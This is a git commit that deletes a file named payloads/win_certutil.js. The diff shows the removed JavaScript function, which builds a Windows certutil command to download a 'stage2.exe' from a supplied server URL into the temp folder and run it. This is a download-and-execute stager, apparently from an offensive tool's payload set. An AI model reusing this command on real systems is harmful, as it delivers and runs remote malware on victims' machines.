4286f1b3cbc3a697a00d970c0eee061f1822af2f
Anonymous 🎭 <157519745+anonymous-beta@users.noreply.github.com>
2026-08-02 10:05:36 +0100

    Delete payloads/win_certutil.js

--- payloads/win_certutil.js
+++
@@ -1,6 +0,0 @@
-function generate(token, serverUrl) {
-    // Downloads payload via certutil, executes
-    return `certutil -urlcache -split -f "${serverUrl}/stage2.exe" %TEMP%\\h_${token}.exe && start %TEMP%\\h_${token}.exe`;
-}
-
-module.exports = { generate };
